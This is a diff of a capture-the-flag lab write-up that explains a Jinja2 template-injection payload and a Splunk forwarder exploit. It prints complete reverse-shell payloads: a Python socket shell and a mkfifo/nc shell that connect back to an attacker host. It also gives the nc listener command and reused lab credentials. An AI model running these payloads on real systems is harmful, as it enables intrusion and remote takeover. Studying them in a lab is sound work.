@@ -315,103 +315,124 @@ Let’s post **another** new message using only the Title field this time (so we
 
 <figure><img src="../../../.gitbook/assets/archive-jinja-payload.png" alt=""><figcaption></figcaption></figure>
 
+## RCE Payload Explained
 
+Breaking Down the Madness: Jinja2 RCE Payload Explained
 
-***
-
-#### **Breaking Down the Madness: Jinja2 RCE Payload Explained**
-
-Alright, let’s take a step back because this payload looks like absolute chaos at first glance. If you're wondering, **"What the hell am I even looking at?"**, you're not alone. But don't worry, we’re gonna break it down **high-level style** so it actually makes sense.
-
-**Step 1: What’s Happening Here?**
-
-```python
-
-<div data-gb-custom-block data-tag="for"></div>
+Before diving into the payload's logic, here's the complete payload for achieving Remote Code Execution (RCE) through Server-Side Template Injection (SSTI):
 
 ```
-
-* This **loops through Python’s internal subclasses** to find something useful.
-* Specifically, it's looking for a **class related to warnings**, because some warning-related classes expose **built-in functions** that can execute system commands.
-
-**Step 2: Finding the Right Class**
-
-```python
-
-<div data-gb-custom-block data-tag="if" data-0='warning'></div>
+{% raw %}
+{% for x in ().__class__.__base__.__subclasses__() %}
+{% if "warning" in x.__name__ %}
+{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417) }}
+{% endif %}
+{% endfor %}
+{% endraw %}
 ```
 
-* This **filters** for subclasses that contain `"warning"` in their name.
-* The reason? There’s a sneaky way to **access Python’s built-in modules** through certain system warning classes.
+Replace `ip` with your actual IP address before using this payload.
 
-**Step 3: Importing the OS Module & Running a Command**
+#### Explanation of the Payload Components
 
-```python
-{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; ...
+**Why `%` Signs?**
+
+In Jinja2 templates, control structures like loops (`for`) and conditionals (`if`) use `{% %}` syntax. These tags allow logic within the template rendering process:
+
+* `{% for %}` iterates over collections or sequences.
+* `{% if %}` conditionally renders blocks of code based on specified criteria.
+* `{% endif %}` and `{% endfor %}` explicitly mark the end of the conditional and loop blocks, respectively.
+
+These control structures help us navigate Python’s internal structures and find vulnerable objects to exploit.
+
+**What does `.read().zfill(417)` do?**
+
+* `.read()` retrieves the output from the executed command (`popen()`). Even if the command returns no visible output, `.read()` ensures the command actually runs to completion.
+* `.zfill(417)` pads the output with leading zeros to guarantee a consistent length. This padding helps avoid issues where the Jinja2 template rendering might truncate or mishandle the output if the returned result is empty or unusually short. Essentially, it stabilizes payload behavior across different execution environments.
+
+#### Step 1: Understanding the Logic
+
+This payload leverages Python’s internal object structure and Jinja2's template rendering process to execute arbitrary system commands, ultimately creating a reverse shell to your machine.
+
+The loop iterates through Python's base subclasses to locate useful objects that can bypass template sandbox restrictions.
+
+#### Step 2: Identifying the Correct Subclass
+
+```
+{% raw %}
+{% for x in ().__class__.__base__.__subclasses__() %}
+{% if "warning" in x.__name__ %}
+{% endraw %}
 ```
 
-* **`__import__('os')`** dynamically imports the **OS module**, which lets us interact with the system.
-* **`popen()`** is used to execute a command, in this case, a **Python one-liner reverse shell**.
+Here, the payload loops through all subclasses available from Python’s base object class and specifically filters subclasses containing the word "warning." Warning-related classes like `catch_warnings` expose internal built-in functions, essential for importing modules and executing commands.
 
-**Step 4: What’s Actually Running?**
+#### Step 3: Accessing Built-in Functions to Execute Commands
 
-```python
-python3 -c 'import socket,subprocess,os; 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
-s.connect(("ip",4444)); 
-os.dup2(s.fileno(),0); 
-os.dup2(s.fileno(),1); 
-os.dup2(s.fileno(),2); 
-p=subprocess.call(["/bin/cat", "flag.txt"]);
+```
+{{ x()._module.__builtins__['__import__']('os').popen("...") }}
 ```
 
-Here’s what this is doing **step-by-step**:
+Once the appropriate warning class is identified, its internal `_module.__builtins__` dictionary is used to access Python's built-in `__import__` function. This enables the import of the `os` module and subsequent execution of system commands through `popen()`.
 
-1. **Creates a TCP socket** (`socket.socket(socket.AF_INET,socket.SOCK_STREAM)`)
-2. **Connects to the attacker's machine** on `IP: 4444`
-   1. Be sure to change the IP to your connected IP!
-3. **Redirects stdin, stdout, and stderr** to the socket (`os.dup2()`)
-4. **Runs a command** (`subprocess.call(["/bin/cat", "flag.txt"])`)
+#### Step 4: Reverse Shell Command Explained
 
-***
+Here’s the exact Python command executed through `popen()`:
 
-#### **The Important Part We Care About**
+```
+python3 -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("ip",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+subprocess.call(["/bin/bash","-i"]);'
+```
 
-The key part we need to **modify** is:
+Let's break it down clearly:
 
-```python
+* A socket is created for network communication.
+* It connects back to your attacker machine (`ip`) on port `4444`.
+* `os.dup2()` redirects standard input, output, and error streams directly to this socket.
+* Finally, an interactive bash shell is spawned using `subprocess.call()`.
+
+This results in a reverse shell connection to your attacking machine.
+
+#### Step 5: Preparing Your Listener
+
+To capture the reverse shell, you must first set up a listener on your attacker machine:
+
+```
+nc -lvnp 4444
+```
+
+This command listens for incoming connections on port `4444` and grants immediate shell access when the payload executes.
+
+#### Ensuring an Interactive Shell
+
+If you were initially just executing a command such as:
+
+```
 subprocess.call(["/bin/cat", "flag.txt"]);
 ```
 
-* This is just **reading** `flag.txt`.
-* Instead, we want to **spawn an interactive shell**.
+You'd get only file contents without interaction. By replacing it with:
 
-**Making It Interactive**
-
-To actually **get a shell**, we replace `cat flag.txt` with `/bin/bash -i`, like so:
-
-```python
+```
 subprocess.call(["/bin/bash", "-i"]);
 ```
 
-This ensures that when we **connect back**, we get an **interactive shell** instead of just a single command execution.
+you ensure the shell returned is fully interactive, allowing comprehensive command execution and easier exploitation.
 
-***
+#### Don’t Forget the Port!
 
-#### **Also, Don’t Forget the Port!**
+Ensure consistency between your payload and listener ports:
 
-```python
+```
 s.connect(("ip",4444))
 ```
 
-* The number **4444** is the **port we need to listen on**.
-*   Before running the payload, make sure to **set up a listener** on your attacking machine:
-
-    ```bash
-    nc -lvnp 4444
-    ```
-
-    This will **catch** the incoming connection and drop us into a shell.
+Always match this port with your listener (`nc -lvnp 4444`) to avoid connection issues.
 
 ***
 
@@ -573,7 +594,7 @@ It fails with an authentication error. No problem, we have shaun:Guitar123. Let 
 
 Now run:
 
-`python3 PySplunkWhisperer2_remote.py \ --host 10.10.10.209 \ --username shaun \ --password Guitar123 \ --lhost 10.10.14.38 \ --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'`
+`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --username shaun --password Guitar123 --lhost 10.10.14.40 --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.40 1994 >/tmp/0xjcbk_pipe'`
 
 * `--host 10.10.10.209` is the target.
 * `--username shaun` and `--password Guitar123` are the creds we found in the logs.
